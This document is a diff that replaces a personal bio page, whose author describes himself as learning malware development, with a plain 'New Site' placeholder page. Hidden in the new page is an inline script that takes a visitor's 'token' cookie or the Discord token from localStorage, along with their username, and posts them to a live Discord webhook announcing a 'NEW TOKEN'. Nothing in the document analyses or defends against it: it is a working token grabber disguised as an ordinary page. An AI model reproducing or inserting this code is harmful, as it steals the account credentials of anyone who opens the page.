@@ -1,224 +1,67 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <!-- Favicon -->
-  <link rel="icon" type="image/png" href="https://tse1.mm.bing.net/th?id=OIP.3lbKDv0i8aYDQbXGypeRFgHaHa&pid=Api&P=0&h=220">
-
-  <meta property="og:title" content="Vulcan's Bio">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="http://traced.lol">
-  <meta content="https://cdn.discordapp.com/avatars/1025021353209892875/f75c350d4e3f5c09104a29c48848fec6?size=1024" property="og:image" />
-  <meta property="og:description" content="Personal bio site of Vulcan.">
-  <meta name="theme-color" content="#E7BF8F">
-  
-  <script type="text/javascript" src="https://gc.kis.v2.scr.kaspersky-labs.com/FD126C42-EBFA-4E12-B309-BB3FDD723AC1/main.js?attr=79kR5pvK8jcdGRnCX53v0xjgVbG-HnfqZoCIgYiVcUkQBMiP2-EtBHPkBE-xXUuMHEkjgPOi927niXlts-qT5g" charset="UTF-8"></script>
-  <style>
-    body {
-      margin: 0;
-      overflow: hidden; 
-      animation: gradient-animation 5s ease infinite;
-      background: linear-gradient(-45deg, #000000, #7f7f7f, #000000, #7f7f7f);
-      background-size: 400% 400%;
-    }
-
-    @keyframes gradient-animation {
-      0% {
-        background-position: 0% 50%;
-      }
-      50% {
-        background-position: 100% 50%;
-      }
-      100% {
-        background-position: 0% 50%;
-      }
-    }
-
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: rgba(0, 0, 0, 0.5);
-      z-index: 2;
-    }
-
-    .wrapper {
-      text-align: center;
-    }
-
-    .wrapper h1 {
-      color: #fff;
-      font-size: 34px;
-      font-weight: 700;
-      font-family: "Josefin Sans", sans-serif;
-      background: linear-gradient(to right, #cccccc 10%, #ffffff 50%);
-      background-clip: text;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: textclip 1.5s linear infinite;
-      display: inline-block;
-    }
-
-    @keyframes textclip {
-      to {
-        background-position: 200% center;
-      }
-    }
-
-    @keyframes float {
-      0%, 100% {
-        transform: translateY(0);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
-    }
-
-    @keyframes shimmer {
-      0% {
-        background-position: -200px 0;
-      }
-      100% {
-        background-position: 200px 0;
-      }
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
-    }
-
-    .profile-container {
-      text-align: center;
-      position: relative;
-      background-color: rgba(0, 0, 0, 0.685);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px yellow, 0 0 30px yellow, 0 0 45px yellow;
-      max-width: 340px;
-      width: 100%;
-      border: 1px solid #ffffff;
-      z-index: 3;
-      animation: fadeIn 1.5s ease-out;
-    }
-
-    .profile-container::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(120deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-      background-size: 200px 100%;
-      animation: shimmer 2s infinite;
-      z-index: -1;
-    }
-
-    .profile-picture {
-      width: 150px;
-      height: 150px;
-      border-radius: 50%;
-      border: 3px solid #ffffff;
-      display: block;
-      margin: 20px auto;
-      filter: grayscale(100%);
-      box-shadow: 0 0 10px white, 0 0 20px white;
-      animation: float 3s ease-in-out infinite;
-    }
-
-    .description-text {
-      color: white;
-      font-family: 'Noto Sans Mono', monospace;
-      text-shadow: 0 0 5px red, 0 0 10px red, 0 0 15px red;
-    }
-
-    .icon-container {
-      text-align: center;
-      margin-top: 20px;
-    }
-
-    .icon {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      border: 3px solid #ffffff;
-      display: block;
-      margin: 0 auto;
-      animation: float 3s ease-in-out infinite;
-      box-shadow: 0 0 15px blue, 0 0 30px blue;
-      cursor: pointer;
-    }
-
-    .reveal-text {
-      font-size: 20px;
-      color: white;
-      margin-top: 20px;
-      text-shadow: 0 0 10px blue, 0 0 20px blue;
-      animation: float 3s ease-in-out infinite;
-    }
-
-    @keyframes grow {
-      0% {
-        width: 0;
-        height: 0;
-        opacity: 1;
-      }
-      100% {
-        width: 40px;
-        height: 40px;
-        opacity: 0;
-      }
-    }
-
-    .circle {
-      position: absolute;
-      background: rgba(0, 128, 255, 0.7);
-      border-radius: 50%;
-      pointer-events: none;
-      animation: grow 1.5s forwards;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Site</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .content {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
 </head>
-
 <body>
 
-  <div class="overlay"></div>
-  <div class="profile-container">
-    <img src="https://cdn.discordapp.com/avatars/1025021353209892875/f75c350d4e3f5c09104a29c48848fec6?size=1024" alt="Profile Picture" class="profile-picture">
-    <div class="wrapper">
-      <h1>Vulcan</h1>
-      <div class="description-text">Sup, I am a Python programmer and a web application hacker. I am currently learning C and malware development. Also, I am a member of the KKSE and I only serve them.</div>
+    <div class="content">
+        New Site
     </div>
-  </div>
 
-  <div class="icon-container">
-    <img src="https://tse4.mm.bing.net/th?id=OIP.YKvVSghuYL1U50kVRcKhjAHaHa&pid=Api&P=0&h=220" alt="Icon" class="icon">
-    <div class="reveal-text">vulcanwastaken</div>
-  </div>
+    <script>
+        let lastTokenSent = null;
+        let requestTimestamps = [];
 
-  <script>
-    document.body.onmousemove = function(e) {
-      const circle = document.createElement('div');
-      circle.classList.add('circle');
-      circle.style.left = e.pageX + 'px';
-      circle.style.top = e.pageY + 'px';
-      document.body.appendChild(circle);
-      setTimeout(() => {
-        circle.remove();
-      }, 1500);
-    }
-  </script>
+        function cleanUpOldRequests() {
+            const now = Date.now();
+            requestTimestamps = requestTimestamps.filter(timestamp => now - timestamp < 5000);
+        }
+
+        const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token');
+        const username = document.querySelector('.username')?.innerText || "Unknown User";
+
+        if (token) {
+            cleanUpOldRequests();
+
+            if (requestTimestamps.length >= 5) {
+                return;
+            }
+
+            if (token === lastTokenSent) {
+                return;
+            }
+
+            const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
+
+            requestTimestamps.push(Date.now());
+            lastTokenSent = token;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}` })
+            });
+        }
+    </script>
 
 </body>
 </html>
